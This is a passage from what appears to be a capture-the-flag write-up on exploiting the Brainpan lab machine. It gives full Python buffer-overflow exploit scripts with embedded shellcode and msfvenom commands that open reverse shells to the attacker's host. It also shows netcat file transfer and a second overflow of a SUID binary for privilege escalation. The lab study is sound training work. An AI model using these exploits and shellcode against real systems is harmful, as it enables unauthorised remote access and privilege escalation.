        <span class="s">"</span><span class="se">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"</span><span class="p">)</span>

<span class="nb">buffer</span><span class="o">=</span><span class="s">"</span><span class="se">\x41</span><span class="s">"</span><span class="o">*</span><span class="mi">524</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x42</span><span class="s">"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">badchars</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Sending buffer.."</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="nb">buffer</span><span class="si">}</span><span class="s"> </span><span class="se">\n\r</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"latin-1"</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Done."</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Couldn't connect with the server"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>After to run the script no bad characters were found, except for the null byte.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 poc4.py
Sending buffer..
Done.
</code></pre></div></div>

<p><img src="/assets/images/brainpan/screenshot-9.png" alt="" /></p>

<h3 id="finding-a-return-address">Finding a return address</h3>

<p>The next step is to find a way to redirect the execution flow to the shellcode located at the ESP register, to this we can use the script mona.py, you can download it <a href="The next step is find a way to redirect the execution flow to the shellcode located at the ESP register">here</a>, that will help us to identify modules in memory, such as a return address, which in our case is a JMP ESP.</p>

<p>I entered the following command within Immunity Debugger.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!</span>mona modules
</code></pre></div></div>

<p><img src="/assets/images/brainpan/screenshot-10.png" alt="" /></p>

<p>In the results we can see a list of several modules, but one catches my attention is brainpan.exe, this one doesn’t have memory protection, so I will use it.</p>

<p>Then we need to find the instruction equivalent to JMP ESP, to this I used the ruby utility msf-nasm_shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msf-nasm_shell 
nasm <span class="o">&gt;</span> jmp esp
00000000  FFE4              jmp esp
</code></pre></div></div>

<p>To find the address JMP ESP, I used the following instruction within Immunity Debugger.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!</span>mona find <span class="nt">-s</span> “<span class="se">\x</span>FF<span class="se">\x</span>E4” <span class="nt">-m</span> brainpan.exe
</code></pre></div></div>

<p><img src="/assets/images/brainpan/screenshot-11.png" alt="" /></p>

<p>We can even verify that the address belongs to the JMP ESP instruction.</p>

<p><img src="/assets/images/brainpan/screenshot-12.png" alt="" /></p>

<h3 id="executing-the-shellcode">Executing the shellcode</h3>

<p>We generate a windows shellcode.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.38.1 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> c <span class="nt">-o</span> shellcode.txt
</code></pre></div></div>

<p>Finally we craft our exploit adding it with 524 A’s, then the JMP ESP address in little endian, then with 20 NOPs (No Operation) and the shellcode.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">host</span><span class="o">=</span><span class="s">"192.168.38.131"</span>
<span class="n">port</span><span class="o">=</span><span class="mi">9999</span>

<span class="n">nops</span><span class="o">=</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="mi">20</span>
<span class="n">shellcode</span><span class="o">=</span><span class="p">(</span>
        <span class="s">"</span><span class="se">\xdb\xd0\xbf\x94\x41\xa1\xae\xd9\x74\x24\xf4\x58\x33\xc9\xb1</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x52\x31\x78\x17\x03\x78\x17\x83\x54\x45\x43\x5b\xa8\xae\x01</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\xa4\x50\x2f\x66\x2c\xb5\x1e\xa6\x4a\xbe\x31\x16\x18\x92\xbd</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\xdd\x4c\x06\x35\x93\x58\x29\xfe\x1e\xbf\x04\xff\x33\x83\x07</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x83\x49\xd0\xe7\xba\x81\x25\xe6\xfb\xfc\xc4\xba\x54\x8a\x7b</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x2a\xd0\xc6\x47\xc1\xaa\xc7\xcf\x36\x7a\xe9\xfe\xe9\xf0\xb0</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x20\x08\xd4\xc8\x68\x12\x39\xf4\x23\xa9\x89\x82\xb5\x7b\xc0</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x6b\x19\x42\xec\x99\x63\x83\xcb\x41\x16\xfd\x2f\xff\x21\x3a</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x4d\xdb\xa4\xd8\xf5\xa8\x1f\x04\x07\x7c\xf9\xcf\x0b\xc9\x8d</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x97\x0f\xcc\x42\xac\x34\x45\x65\x62\xbd\x1d\x42\xa6\xe5\xc6</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\xeb\xff\x43\xa8\x14\x1f\x2c\x15\xb1\x54\xc1\x42\xc8\x37\x8e</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\xa7\xe1\xc7\x4e\xa0\x72\xb4\x7c\x6f\x29\x52\xcd\xf8\xf7\xa5</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x32\xd3\x40\x39\xcd\xdc\xb0\x10\x0a\x88\xe0\x0a\xbb\xb1\x6a</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\xca\x44\x64\x3c\x9a\xea\xd7\xfd\x4a\x4b\x88\x95\x80\x44\xf7</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x86\xab\x8e\x90\x2d\x56\x59\x5f\x19\x7e\x98\x37\x58\x7e\x9b</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x7c\xd5\x98\xf1\x92\xb0\x33\x6e\x0a\x99\xcf\x0f\xd3\x37\xaa</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x10\x5f\xb4\x4b\xde\xa8\xb1\x5f\xb7\x58\x8c\x3d\x1e\x66\x3a</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x29\xfc\xf5\xa1\xa9\x8b\xe5\x7d\xfe\xdc\xd8\x77\x6a\xf1\x43</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x2e\x88\x08\x15\x09\x08\xd7\xe6\x94\x91\x9a\x53\xb3\x81\x62</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x5b\xff\xf5\x3a\x0a\xa9\xa3\xfc\xe4\x1b\x1d\x57\x5a\xf2\xc9</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x2e\x90\xc5\x8f\x2e\xfd\xb3\x6f\x9e\xa8\x85\x90\x2f\x3d\x02</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\xe9\x4d\xdd\xed\x20\xd6\xfd\x0f\xe0\x23\x96\x89\x61\x8e\xfb</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x29\x5c\xcd\x05\xaa\x54\xae\xf1\xb2\x1d\xab\xbe\x74\xce\xc1</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\xaf\x10\xf0\x76\xcf\x30</span><span class="s">"</span><span class="p">)</span>

<span class="c1">#EIP: 311712f3
</span><span class="nb">buffer</span><span class="o">=</span><span class="s">"</span><span class="se">\x41</span><span class="s">"</span><span class="o">*</span><span class="mi">524</span> <span class="o">+</span> <span class="s">"</span><span class="se">\xf3\x12\x17\x31</span><span class="s">"</span> <span class="o">+</span> <span class="n">nops</span> <span class="o">+</span> <span class="n">shellcode</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Sending shellcode.."</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="nb">buffer</span><span class="si">}</span><span class="s"> </span><span class="se">\n\r</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"latin-1"</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Check your netcat listener"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Couldn't connect with the server"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>We need to set up a netcat listener in this case on port 443 and run the final exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 poc5.py
Sending shellcode..
Check your netcat listener
</code></pre></div></div>

<p>And we get a reverse shell from our test machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.38.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.38.131] 49170
Microsoft Windows <span class="o">[</span>Versin 6.1.7601]
Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation. Reservados todos los derechos.

C:<span class="se">\U</span>sers<span class="se">\J</span>ohn<span class="se">\D</span>esktop&gt;whoami
<span class="nb">whoami
</span>pc<span class="se">\j</span>ohn
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="buffer-overflow">Buffer Overflow</h3>

<p>To exploit the target machine, we generate a linux shellcode.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">-p</span> linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.179.1 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> c <span class="nt">-o</span> linux_shellcode.txt
</code></pre></div></div>

<p>At this point we just need to replace the windows shellcode with the linux shellcode.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">host</span><span class="o">=</span><span class="s">"192.168.179.159"</span>
<span class="n">port</span><span class="o">=</span><span class="mi">9999</span>

<span class="n">nops</span><span class="o">=</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="mi">20</span>
<span class="n">shellcode</span><span class="o">=</span><span class="p">(</span>
        <span class="s">"</span><span class="se">\xbd\xce\x9e\x7f\xbd\xd9\xee\xd9\x74\x24\xf4\x5a\x29\xc9\xb1</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x12\x31\x6a\x12\x83\xea\xfc\x03\xa4\x90\x9d\x48\x09\x76\x96</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x50\x3a\xcb\x0a\xfd\xbe\x42\x4d\xb1\xd8\x99\x0e\x21\x7d\x92</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x30\x8b\xfd\x9b\x37\xea\x95\xdb\x60\xbf\x64\xb4\x72\xc0\x67</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\xff\xfa\x21\xd7\x99\xac\xf0\x44\xd5\x4e\x7a\x8b\xd4\xd1\x2e</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\x23\x89\xfe\xbd\xdb\x3d\x2e\x6d\x79\xd7\xb9\x92\x2f\x74\x33</span><span class="s">"</span> <span class="o">+</span>
        <span class="s">"</span><span class="se">\xb5\x7f\x71\x8e\xb6</span><span class="s">"</span><span class="p">)</span>

<span class="c1">#EIP: 311712f3
</span><span class="nb">buffer</span><span class="o">=</span><span class="s">"</span><span class="se">\x41</span><span class="s">"</span><span class="o">*</span><span class="mi">524</span> <span class="o">+</span> <span class="s">"</span><span class="se">\xf3\x12\x17\x31</span><span class="s">"</span> <span class="o">+</span> <span class="n">nops</span> <span class="o">+</span> <span class="n">shellcode</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Sending shellcode.."</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="nb">buffer</span><span class="si">}</span><span class="s"> </span><span class="se">\n\r</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"latin-1"</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Check your netcat listener."</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Couldn't connect with the server"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>We set up a netcat listener on port 443 and run the exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 exploit.py
Sending shellcode..
Check your netcat listener.
</code></pre></div></div>

<p>We got a linux reverse shell and upgraded it  to a TTY shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443                         
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.159] 45814
<span class="nb">id  
</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>puck<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>puck<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>puck<span class="o">)</span>
python <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
puck@brainpan:/home/puck<span class="err">$</span>
</code></pre></div></div>

<p>Listing the SUID binaries I found one called validate, which belongs to user anansi.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puck@brainpan:/home/puck<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null 
...
<span class="nt">-rwsr-xr-x</span> 1 anansi anansi 8761 Mar  4  2013 /usr/local/bin/validate
...
</code></pre></div></div>

<p>This binary file takes a string as input and tries to validate it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puck@brainpan:/home/puck<span class="nv">$ </span>/usr/local/bin/validate
usage /usr/local/bin/validate &lt;input&gt;
puck@brainpan:/home/puck<span class="nv">$ </span>/usr/local/bin/validate bash
validating input...passed.
</code></pre></div></div>

<p>This looks interesting, so I transferred it to the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 3333 <span class="o">&gt;</span> validate

puck@brainpan:/home/puck<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/validate | nc 192.168.179.1 3333
</code></pre></div></div>

<p>Debugging the binary file, I passed as input 500 A’s and the EIP was overwritten causing a segmentation fault.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gdb <span class="nt">-q</span> validate                                 
Reading symbols from validate...
<span class="o">(</span>gdb<span class="o">)</span> r <span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s2">"print('A'*500)"</span><span class="si">)</span>
Starting program: /root/brainpan1/validate <span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s2">"print('A'*500)"</span><span class="si">)</span>

Program received signal SIGSEGV, Segmentation fault.
0x41414141 <span class="k">in</span> ?? <span class="o">()</span>
</code></pre></div></div>

<p>So I discovered that the EIP is overwritten after 116 bytes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> r <span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s2">"print('A'*116 + 'B'*4)"</span><span class="si">)</span>
Starting program: /root/brainpan1/validate <span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s2">"print('A'*116 + 'B'*4)"</span><span class="si">)</span>

Program received signal SIGSEGV, Segmentation fault.
0x42424242 <span class="k">in</span> ?? <span class="o">()</span>
</code></pre></div></div>

<p>We need a way to execute the shellcode, I looked for a JMP ESP instruction but nothing, so I decided search for a CALL EAX instruction and found two address.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>/usr/share/framework2/msfelfscan <span class="nt">-f</span> validate <span class="nt">-j</span> esp     
root@kali:~<span class="nv">$ </span>/usr/share/framework2/msfelfscan <span class="nt">-f</span> validate <span class="nt">-j</span> eax
0x080484af   call eax
0x0804862b   call eax
</code></pre></div></div>

<p>But we don’t know where the CALL EAX instruction in pointing, so I debugged the binary again and found that this points directly to the beginning of the buffer of A’s.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/wx <span class="nv">$eax</span>
0xffffd3d8:     0x41414141
</code></pre></div></div>

<p>The next step is to generate the shellcode that allows us to execute a /bin/sh.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">-p</span> linux/x86/exec <span class="nt">-e</span> x86/shikata_ga_nai <span class="nv">cmd</span><span class="o">=</span>/bin/sh <span class="nt">-f</span> c <span class="nt">-o</span> priv_esc_shellcode.txt

root@kali:~<span class="nv">$ </span><span class="nb">tail</span> <span class="nt">-n</span> +2 priv_esc_shellcode.txt | <span class="nb">sed</span> <span class="s1">'s/;//;s/"//g'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> 
<span class="se">\x</span>bf<span class="se">\x</span>c3<span class="se">\x</span>32<span class="se">\x</span>97<span class="se">\x</span>4f<span class="se">\x</span><span class="nb">dd</span><span class="se">\x</span>c0<span class="se">\x</span>d9<span class="se">\x</span>74<span class="se">\x</span>24<span class="se">\x</span>f4<span class="se">\x</span>5a<span class="se">\x</span>31<span class="se">\x</span>c9<span class="se">\x</span>b1<span class="se">\x</span>0b<span class="se">\x</span>83<span class="se">\x</span>c2<span class="se">\x</span>04<span class="se">\x</span>31<span class="se">\x</span>7a<span class="se">\x</span>11<span class="se">\x</span>03<span class="se">\x</span>7a<span class="se">\x</span>11<span class="se">\x</span>e2<span class="se">\x</span>36<span class="se">\x</span>58<span class="se">\x</span>9c<span class="se">\x</span>17<span class="se">\x</span>21<span class="se">\x</span>cf<span class="se">\x</span>c4<span class="se">\x</span>cf<span class="se">\x</span>7c<span class="se">\x</span>93<span class="se">\x</span>81<span class="se">\x</span>f7<span class="se">\x</span>16<span class="se">\x</span>7c<span class="se">\x</span>e1<span class="se">\x</span>9f<span class="se">\x</span>e6<span class="se">\x</span>ea<span class="se">\x</span>2a<span class="se">\x</span>02<span class="se">\x</span>8f<span class="se">\x</span>84<span class="se">\x</span>bd<span class="se">\x</span>21<span class="se">\x</span>1d<span class="se">\x</span>b1<span class="se">\x</span>b6<span class="se">\x</span>a5<span class="se">\x</span>a1<span class="se">\x</span>41<span class="se">\x</span>e8<span class="se">\x</span>c7<span class="se">\x</span>c8<span class="se">\x</span>2f<span class="se">\x</span>d9<span class="se">\x</span>74<span class="se">\x</span>62<span class="se">\x</span>b0<span class="se">\x</span>72<span class="se">\x</span>28<span class="se">\x</span>fb<span class="se">\x</span>51<span class="se">\x</span>b1<span class="se">\x</span>4e
</code></pre></div></div>

<p>The generated shellcode is 70 bytes, so we can use it without problems, another tiny shellcode that works perfectly you can find it <a href="http://shell-storm.org/shellcode/files/shellcode-841.php">here</a>.</p>

<p>With this information I can build the malicious instructions, adding with 20 NOPs, then the 70 bytes shellcode, then with the remaining NOPs to complete the buffer of 116 bytes, and finally the CALL EAX instruction in little endian.</p>

<p>Now we are the user ananci.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puck@brainpan:/home/puck<span class="nv">$ </span>/usr/local/bin/validate <span class="si">$(</span>python <span class="nt">-c</span> <span class="s2">"print('</span><span class="se">\x</span><span class="s2">90'*20 + '</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">dd</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">9c</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">21</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">9f</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">2a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">bd</span><span class="se">\x</span><span class="s2">21</span><span class="se">\x</span><span class="s2">1d</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">a5</span><span class="se">\x</span><span class="s2">a1</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">fb</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">4e' + '</span><span class="se">\x</span><span class="s2">90'*(116-70-20) + '</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08')"</span><span class="si">)</span>
<span class="nv">$ </span><span class="nb">id
